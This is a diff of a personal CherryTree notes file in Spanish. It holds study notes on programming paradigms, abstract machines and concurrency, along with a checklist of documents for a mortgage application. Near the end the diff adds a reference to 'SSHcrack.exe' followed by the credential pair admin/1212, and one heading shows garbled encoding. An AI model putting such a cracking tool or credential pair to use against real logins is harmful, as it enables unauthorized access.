+    <node name="Historia de los langs" unique_id="189" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698688730" ts_lastsave="1699155613">
+      <rich_text>las maquinas abstractas tienen:
+- procesar datos primitivos
+- controlar secuencias de ejecucion de operaciones
+- controlar transferencia de datos
+- manejo de memoria
+
+ciclo de ejecucion:
+- inicio
+- trae instrucciones
+- decodifica
+- trae operando
+- elige que ejecutar
+- se guarda el estado si es que existen muchas operaciones
+- terminando las operaciones finaliza
+
+niveles de descripcion:
+- gramatica
+   → que oraciones son las correctas
+   → secuencia de tokens
+   → frases del lenguaje propio
+- semantica
+   → que significa una oracion correcta
+- pragmatica
+   → como usamos una oracion significativa, que quiere decir
+- implementacion
+
+imperativo, dice que va a hacer y como se va a hacer
+declarativo, se enfoca en el resultado, no importa tanto el como
+
+funcional tambien es declarativo, es complejo de aprende y analizar
+se basa en funciones matematicas
+primera clase, reconocidas para utilizarse como cualquier tipo de dato, se pueden llamar desde cualquier lado
+orden superior, toma una o mas funciones como parametro, retorna una funcion como salida
+funciones puras, son deterministicas, un valor de entrada da uno de salida, no genera efectos secundarios, no incluye funciones impuras, el resultado siempre es el mismo
+funciones lambda, anonima, comportamiento de uso unico, contexto especifico o corto tiempo, simplicidad
+efectos secundarios, estado de la aplicacion, valores en datos, modificacion de archivos, hasta llamado de un servidor
+
+prog logica, NLP, recuperacion en BBDD, aplicaciones matematicas
+	se basa en las clausulas de Horn
+	
+concurrencia un recurso, paralelismo varios recursos
+estados de hilos:
+	creado
+	ejecutable/listo
+	ejecutando
+	bloqueado
+	terminado
+	
+	
+</rich_text>
+      <rich_text scale="h3" foreground="#eff3f8">Qué es la máquina abstracta?</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text scale="h3" foreground="#eff3f8">QuĆ© problema de la programaciĆ³n secuencial buscaba resolver el paradigma estructurado?</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text scale="h3" foreground="#eff3f8">En qué situación del mundo real podemos apreciar un caso de concurrencia?</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text scale="h3" foreground="#eff3f8">Qué lenguaje introdujo el concepto de "código intermedio"?</rich_text>
     </node>
   </node>
   <node name="Crecimiento personal" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617947184" ts_lastsave="1684703124">
@@ -14651,7 +15915,7 @@ Macreos
 		not support stacksets</rich_text>
     </node>
   </node>
-  <node name="notes" unique_id="156" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685390640" ts_lastsave="1687467339">
+  <node name="notes" unique_id="156" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685390640" ts_lastsave="1689612800">
     <rich_text>
 *	Identificación oficial vigente (INE, en caso de pasaporte nos lo validan pero nos piden otra identificación adicional, como cedula, licencia… )
 *	Comprobante de domicilio, no mayor a dos meses 
@@ -14661,9 +15925,9 @@ Macreos
 *	Constancia de situación fiscal del mes en curso (Para asalariados es opcional, pero si podemos conseguirla mucho mejor)
 
 
-*Últimos 3 meses de estados de cuenta donde depositen la nómina.  (Si escogemos Banamex como opción de banco, nos pedirán 6 meses)
-*Últimos 3 meses de recibos de Nómina. (Si escogemos como banco Banamex, ellos nos piden 6 meses de recibos de nòmina)
-*	Comprobante de estabilidad laboral: Si los recibos de nómina tienen su fecha de ingreso, con eso ya se está validando este requisito, en caso de que   no tengan ese dato, una carta laboral validando tu antigüedad en el trabajo.
+• Últimos 3 meses de estados de cuenta donde depositen la nómina.  (Si escogemos Banamex como opción de banco, nos pedirán 6 meses)
+• Últimos 3 meses de recibos de Nómina. (Si escogemos como banco Banamex, ellos nos piden 6 meses de recibos de nòmina)
+• Comprobante de estabilidad laboral: Si los recibos de nómina tienen su fecha de ingreso, con eso ya se está validando este requisito, en caso de que   no tengan ese dato, una carta laboral validando tu antigüedad en el trabajo.
 
 
 **En caso de que el cliente tramite su crédito como Cofinavit, se le pide lo siguiente:
@@ -14671,8 +15935,12 @@ Macreos
 *Pantallas de cuenta Infonavit (Pantalla de sin crédito Vigente y cuanto ahorro Tengo)
 *Tabla de amortización de crédito modalidad Cofinavit
 
+bin/SSHcrack.exe
+admin
+1212
 
-</rich_text>
-    <rich_text link="webs https://marketplaces-api.zebrands.mx/health/">https://marketplaces-api.zebrands.mx/health/</rich_text>
+
+bench update --reset
+bench --site zecore-dev.localhost migrate</rich_text>
   </node>
 </cherrytree>
